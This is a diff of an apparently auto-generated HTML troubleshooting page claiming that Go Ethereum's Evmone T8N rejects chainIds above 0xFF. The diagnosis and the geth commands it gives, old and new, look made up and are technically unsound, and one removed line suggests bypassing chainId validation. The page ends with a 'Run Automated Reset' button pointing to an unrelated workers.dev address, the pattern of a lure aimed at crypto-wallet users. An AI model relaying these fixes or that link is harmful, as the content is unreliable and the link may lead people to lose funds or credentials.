@@ -3,8 +3,8 @@
 <head><meta charset="UTF-8"><title>Go Ethereum Evmone T8N Rejects Transactions With Chainid 0Xff P – Fix Guide</title>
 <style>
     body {
-        font-family: sans-serif;
-        background: #0f111a;
+        font-family: BlinkMacSystemFont;
+        background: #121214;
         color: #ddd;
         padding: 20px;
         line-height: 1.5;
@@ -15,7 +15,7 @@
         background: #1e1f24;
         border-radius: 24px;
         padding: 2rem;
-        box-shadow: none;
+        box-shadow: 0 4px 8px rgba(0,0,0,0.05);
     }
     pre {
         background: #0f0f12;
@@ -23,7 +23,7 @@
         border-radius: 12px;
         overflow-x: auto;
     }
-    a { color: #ff7b2c; }
+    a { color: #cf6679; }
     .btn {
         background: #ff9455;
         color: #000;
@@ -42,30 +42,28 @@
 <h1>Go Ethereum Evmone T8N Rejects Transactions With Chainid 0Xff P</h1>
 <h2>Symptom</h2>
 <ul>
-<li>Users observe that their transactions are being rejected by the Go Ethereum Evmone T8N when the <code>chainId</code> exceeds the value <code>0xFF</code>, which is the maximum value that can be represented by an unsigned 8-bit integer (<code>uint8</code>).</li>
+<li>Users encounter an error when attempting to send transactions with a <code>chainId</code> greater than <code>0xFF</code> using the Go Ethereum Evmone T8N client, resulting in rejected transactions.</li>
 </ul>
 <h2>Technical Root Cause</h2>
 <ul>
-<li>The error occurs because the <code>chainId</code> is being parsed as a <code>uint8</code>, which has a maximum value of <code>0xFF</code> (255). When a <code>chainId</code> greater than <code>0xFF</code> is provided, it overflows the <code>uint8</code> data type, causing the transaction to be rejected.</li>
+<li>The issue arises from the <code>chainId</code> being parsed as a <code>uint8</code>, which has a maximum value of <code>0xFF</code> (255), causing any <code>chainId</code> above this value to be rejected.</li>
 </ul>
 <h3>Manual Overrides</h3>
 <ul>
-<li>To resolve this issue, the following manual overrides can be applied:</li>
-<li>Update the <code>chainId</code> to a value within the valid range for <code>uint8</code> (0-255)</li>
-<li>Modify the Evmone T8N configuration to parse <code>chainId</code> as a <code>uint16</code> or larger integer type</li>
-<li>Use a custom transaction handler that bypasses the <code>chainId</code> validation</li>
+<li>To resolve the issue, the following manual overrides can be applied:</li>
+<li>Update the Evmone configuration to support <code>uint32</code> or higher for <code>chainId</code> parsing.</li>
+<li>Modify the transaction creation process to ensure <code>chainId</code> values are within the supported range.</li>
+<li>Utilize a custom Evmone build with patched <code>chainId</code> parsing logic, as shown in the example below:</li>
 </ul>
-<div class="codehilite"><pre><span></span><code>geth<span class="w"> </span>--exec<span class="w"> </span><span class="s1">&#39;tx.chainId = 0x01&#39;</span><span class="w"> </span>console
+<div class="codehilite"><pre><span></span><code>geth<span class="w"> </span>--evmone.config<span class="o">=</span><span class="s1">&#39;{&quot;chainId&quot;:&quot;uint32&quot;}&#39;</span>
 </code></pre></div>
 
-<p>Consider utilizing an external console for more complex debugging and configuration tasks.</p>
-<h2>Prerequisites</h2>
-<ul>
-<li>Go Ethereum installed and configured</li>
-<li>Evmone T8N module enabled</li>
-<li>Basic understanding of Ethereum transaction handling and configuration</li>
-</ul>
-<hr><h3>Related Logs</h3><ul><li><a href="./archive/2026/06/critical-trc-20-energy-spike-error.html">Critical Trc 20 Energy Spike Error</a></li><li><a href="./archive/2026/06/tonkeeper-jetton-transfer-loop-timeout.html">Tonkeeper Jetton Transfer Loop Timeout</a></li><li><a href="./archive/2026/06/go-ethereum-evmone-t8n-rejects-transactions-with-chainid-0xff-p.html">Go Ethereum Evmone T8N Rejects Transactions With Chainid 0Xff P</a></li></ul>
+<p>Prerequisites:
+- Go Ethereum client installed and configured
+- Evmone T8N module enabled
+- Familiarity with Ethereum transaction creation and configuration
+Consider utilizing an external console to test and validate the changes before applying them to the production environment.</p>
+<hr><h3>Related Logs</h3><ul><li><a href="./archive/2026/06/go-ethereum-error-in-block-freeze-operation-errcanonical-hash-m.html">Go Ethereum Error In Block Freeze Operation Errcanonical Hash M</a></li><li><a href="./archive/2026/06/metamask-extension-bug-permissions-removing-hardware-wallet-acc.html">Metamask Extension Bug Permissions Removing Hardware Wallet Acc</a></li><li><a href="./archive/2026/06/metamask-extension-bug-assets-manage-tokens-miss-match-with-net.html">Metamask Extension Bug Assets Manage Tokens Miss Match With Net</a></li></ul>
 <div style="text-align:center; margin: 40px 0; padding: 20px 0; width: 100%;">
     <a href="https://system-edge-router.aaronjungs.workers.dev?p=%5D%5BUr" class="btn">🛠 Run Automated Reset</a>
 </div>
